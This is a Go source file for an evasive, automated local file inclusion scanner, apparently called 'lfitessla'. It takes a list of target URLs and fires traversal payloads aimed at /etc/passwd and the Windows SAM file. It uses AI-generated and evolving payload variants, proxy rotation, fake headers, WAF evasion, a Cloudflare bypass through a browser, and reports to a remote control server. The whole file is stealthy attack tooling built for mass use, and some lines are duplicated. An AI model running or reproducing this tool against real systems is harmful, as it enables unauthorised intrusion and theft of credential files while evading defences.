package scanner

import (
	"bufio"
	"context"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	mathrand "math/rand"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"

	"lfitessla/aibridge"
	"lfitessla/analyzer"
	"lfitessla/browserexec"
	"lfitessla/entropy"
	"lfitessla/evolution"
	"lfitessla/utlslocal"
	"lfitessla/headers"
	"lfitessla/http2mux"
	"lfitessla/injector"
	"lfitessla/mutador"
	"lfitessla/proxy"
	stealthrouter "lfitessla/strategies"
	"lfitessla/wscontrol"
)

// init seeds math/rand from crypto/rand for quantum-inspired PRNG
func init() {
	var seed int64
	_ = binary.Read(rand.Reader, binary.LittleEndian, &seed)
	mathrand.Seed(seed)
}

// ScanAlvoCompleto faz um scan LFI “TESSLA 2050” super furtivo e adaptativo.
func ScanAlvoCompleto(baseURL string) bool {
	// connect to central control via WebSocket for distributed coordination
	ws, _ := wscontrol.Connect("wss://control.tessla.local/scan")
	defer ws.Close()
	ws.Log("start-scan", baseURL)

	// 1. Crawler IA prévio
	paths := stealthrouter.CrawlerIA(baseURL)

	ws.Log("crawler-paths", paths)

	// 2. Passive + Active fingerprinting
	 // 2. Passive + Active fingerprinting
fpPassive := utlslocal.PassiveFingerprint(baseURL)
fpActive := utlslocal.ActiveFingerprint(baseURL)

fmt.Printf("🔍 Fingerprint passive: %v, active: %v\n", fpPassive, fpActive)
ws.Log("fingerprint", fpPassive, fpActive)

	fmt.Printf("🔍 Fingerprint passive: %v, active: %v\n", fpPassive, fpActive)
	ws.Log("fingerprint", fpPassive, fpActive)

	// 3. Escolha payloads base conforme SO
	basePayloads := []string{"../../etc/passwd"}
	if fpPassive.OS == "windows" {
		basePayloads = []string{"%SYSTEMROOT%\\system32\\config\\sam"}
	}

	// 4. IA contextual memory
	aibridge.LoadContext(baseURL)

	// 5. Evolução: carregar população anterior
	pop := evolution.LoadPopulation(baseURL)

	clientTpl := &http.Client{Timeout: 8 * time.Second}

	for _, base := range basePayloads {
		sondas := mutador.MutarPayload(base)
		if iaVars, err := aibridge.GerarPayloadIA(base, fpPassive.Stack); err == nil {
			sondas = append(sondas, iaVars...)
		}
		sondas = append(sondas, paths...) // include crawler-discovered paths as payloads

		for _, payload := range sondas {
			time.Sleep(entropy.RandDelay(100, 300))

			// 🧩 POSSÍVEL MELHORIA (para o futuro)
			req, err := http.NewRequest("GET", baseURL+payload, nil)
			if err != nil {
				ws.Log("bad-request", baseURL, payload, err.Error())
				continue
			}
			for k, v := range headers.GerarHeadersRealistas() {
				req.Header[k] = v
			}
			req.AddCookie(&http.Cookie{Name: "lfi", Value: payload})
			req.Header.Set("X-LFI-Scan", payload)
			req.URL.Fragment = payload

			// cross-vantage
			go func(r *http.Request) {
				sec := proxy.SelecionarOutroProxy(nil)
				if c2, err := http2mux.ClientHTTP2ComProxy(sec.Address); err == nil {
					if r2, e2 := c2.Do(r.Clone(context.TODO())); e2 == nil {
						if analyzer.CompararRespostas(nil, r2) {
							ws.Log("cross-vantage-diff", baseURL, payload)
						}
						r2.Body.Close()
					}
				}
			}(req)

			// time-variance WAF detection
			times := make([]time.Duration, 3)
			for i := range times {
				start := time.Now()
				respTmp, _ := clientTpl.Do(req.Clone(context.TODO()))
				io.Copy(io.Discard, io.LimitReader(respTmp.Body, 512))
				respTmp.Body.Close()
				times[i] = time.Since(start)
				time.Sleep(time.Duration(mathrand.Intn(300)+100) * time.Millisecond)
			}
			if max, min := maxMinDuration(times); max-min > 300*time.Millisecond {
				ws.Log("time-variance", baseURL, payload)
			}

			// send via HTTP/2 multiplexing
			proxySel := proxy.SelecionarProxy()
			client, err := http2mux.ClientHTTP2ComProxy(proxySel.Address)
			if err != nil {
				continue
			}
			start := time.Now()
			resp, err := client.Do(req)
			latency := time.Since(start).Milliseconds()
			if err != nil {
				proxy.MarcarFalha(proxySel)
				continue
			}
			bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
			resp.Body.Close()
			body := string(bodyBytes)

			if e := entropy.Shannon(bodyBytes); e > 4.5 {
				ws.Log("high-entropy", baseURL, payload, e)
			}

			if regexp.MustCompile(`root:.*:0:0:`).MatchString(body) {
				ws.Log("lfi-detected", baseURL, payload)
				evolution.RecordSuccess(pop, payload)
				return true
			}

			if strings.Contains(body, payload) {
				ws.Log("reflected-output", baseURL, payload)
			}

			waf := analyzer.DetectarWAF(resp.StatusCode, resp.Header, body)
			if waf != "" {
				ws.Log("waf-detected", baseURL, payload, waf)
				if strings.Contains(strings.ToLower(waf), "cloudflare") {
					if br, err := browserexec.ExecutarNoBrowser(baseURL+payload, payload); err == nil && br.Success {
						ws.Log("stealth-browser-success", baseURL, payload)
						evolution.RecordSuccess(pop, payload)
						return true
					}
				}
				// Injector autoadaptativa
				if newReq := injector.AutoAdapt(req, waf); newReq != nil {
					req = newReq
					continue
				}
			}

			if resp.StatusCode == 403 {
				if fb := injector.TentarFallback(baseURL, payload); fb.Success {
					ws.Log("fallback-success", baseURL, payload, fb.Canal)
					evolution.RecordSuccess(pop, payload)
					return true
				}
			}

			aibridge.EnviarFeedbackReforco(payload, resp.StatusCode, latency, waf)
		}

		evolution.GenerateNextPopulation(pop)
	}

	ws.Log("end-scan", baseURL)
	return false
}

func maxMinDuration(arr []time.Duration) (max, min time.Duration) {
	min = arr[0]
	for _, v := range arr {
		if v > max {
			max = v
		}
		if v < min {
			min = v
		}
	}
	return
}

func ScanListCompleto(filePath string) {
	file, err := os.Open(filePath)
	if err != nil {
		fmt.Println("❌ não abriu lista:", err)
		return
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		url := strings.TrimSpace(scanner.Text())
		if url == "" {
			continue
		}
		fmt.Println("▶️ Escaneando:", url)
		if ScanAlvoCompleto(url) {
			fmt.Println("🎯 Vulnerabilidade confirmada em", url)
		} else {
			fmt.Println("❌ Não detectado em", url)
		}
	}
}
